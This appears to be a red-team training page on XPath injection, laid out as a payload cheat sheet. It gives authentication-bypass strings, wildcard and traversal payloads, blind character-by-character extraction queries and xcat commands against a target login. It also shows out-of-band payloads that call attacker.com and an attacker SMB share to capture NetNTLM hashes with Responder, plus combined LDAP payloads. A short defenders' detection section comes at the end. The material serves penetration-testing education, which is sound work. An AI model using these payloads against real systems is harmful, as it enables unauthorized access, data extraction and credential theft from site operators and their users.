---
layout: training-page
title: "XPath Injection — Red Team Academy"
module: "Web Hacking"
tags:
  - xpath-injection
  - xml
  - authentication-bypass
  - blind-injection
  - out-of-band
page_key: "web-xpath-injection"
render_with_liquid: false
---

# XPath Injection

XPath Injection exploits applications that build XPath queries from unsanitized user input to
  query or navigate XML documents. Like SQL injection, injecting XPath metacharacters and logic
  operators allows authentication bypass, data extraction, and in some configurations, out-of-band
  network requests (e.g., stealing NetNTLM hashes via UNC paths on Windows).

## Tools

- orf/xcat — automate XPath injection attacks to retrieve documents — `github.com/orf/xcat`
- feakk/xxxpwn — advanced XPath injection tool — `github.com/feakk/xxxpwn`
- aayla-secura/xxxpwn_smart — predictive text XPath injection — `github.com/aayla-secura/xxxpwn_smart`
- micsoftvn/xpath-blind-explorer — `github.com/micsoftvn/xpath-blind-explorer`
- Harshal35/XmlChor — XPath exploitation tool — `github.com/Harshal35/XMLCHOR`

## Vulnerable Query Pattern

A typical vulnerable login query constructs an XPath expression directly from user input:

```
string(//user[name/text()='USERNAME' and password/text()='PASSWORD']/account/text())
```

If both fields are user-controlled and unsanitized, injecting XPath metacharacters manipulates
  the query logic.

## Authentication Bypass Payloads

```
' or '1'='1
' or ''='
x' or 1=1 or 'x'='y
' or 1=1 or ''='
' or true() or ''='
```

These payloads short-circuit the AND condition, causing the query to return results regardless
  of the password value.

## Path Traversal and Wildcard Payloads

```
/
//
//*
*/*
@*
count(/child::node())
x' or name()='username' or 'x'='y
' and count(/*)=1 and '1'='1
' and count(/@*)=1 and '1'='1
' and count(/comment())=1 and '1'='1
')] | //user/*[contains(*,'
') and contains(../password,'c
') and starts-with(../password,'c
```

## Blind XPath Injection

When the application returns no visible data but behaves differently based on whether the
  XPath query returns results, extract data character by character using boolean conditions.

### Determine String Length

```
' and string-length(account)=1 and '1'='1
' and string-length(account)=2 and '1'='1
' and string-length(account)=5 and '1'='1
# True response when the length matches
```

### Extract Characters with substring()

```
' and substring(//user[userid=5]/username,1,1)='a' and '1'='1
' and substring(//user[userid=5]/username,2,1)='d' and '1'='1
' and substring(//user[userid=5]/username,3,1)='m' and '1'='1
# Automate with xcat to iterate all positions and characters
```

### Extract Characters Using codepoints-to-string()

```
' and substring(//user[userid=5]/username,1,1)=codepoints-to-string(97) and '1'='1
# 97 = ASCII 'a'; iterate through 33–126 for printable characters
```

## Automated Blind Extraction with xcat

```
# Install xcat
pip install xcat

# Basic authentication bypass test
xcat --method POST --url http://target.com/login \
     --true-string "Welcome" --false-string "Invalid" \
     --username-field user --password-field pass \
     "' or true() or 'x'='y"

# Extract document structure
xcat run http://target.com/search --true-string "results" \
     --param q "' or '1'='1" retrieve-document
```

## Out-of-Band Exploitation

On systems where the XPath processor supports the `doc()` function (XPath 2.0),
  the attacker can trigger network requests — including to attacker-controlled SMB shares on
  Windows to capture NetNTLM hashes.

```
# Trigger out-of-band HTTP/SMB request:
http://example.com/?title=Foundation&type=*&rent_days=* and doc('http://attacker.com/leak')

# On Windows — capture NetNTLM via SMB:
http://example.com/?param=* and doc('//attacker-ip/share')

# Use Responder to capture the hash:
responder -I eth0 -v
```

## LDAP-XPath Combined Payloads

Some applications use XPath to query XML configurations that also store LDAP-style data.
  Combine XPath injection with LDAP special characters when applicable:

```
*)(uid=*))(|(uid=*
*)(|(password=*
)(cn=*
```

## Detection Signals (For Defenders)

- XPath error messages in HTTP responses (e.g., "XPathException", "Invalid XPath expression")
- Boolean-based behavioral differences between payloads like `' or '1'='1` and `' or '1'='2`
- Unusual characters in parameters: single quotes, square brackets, slashes, colons
- Unexpected network connections from the web server to internal or external hosts

## Resources

- PayloadsAllTheThings XPATH Injection — `github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XPATH%20Injection`
- OWASP XPath Injection testing guide — `owasp.org/www-project-web-security-testing-guide`
- xcat tool — `github.com/orf/xcat`
- xxxpwn advanced tool — `github.com/feakk/xxxpwn`
- Places of Interest in Stealing NetNTLM Hashes — Osanda Malith Jayathissa
- Root Me XPath Injection challenges — `root-me.org/en/Challenges/Web-Server/XPath-injection-Authentication`
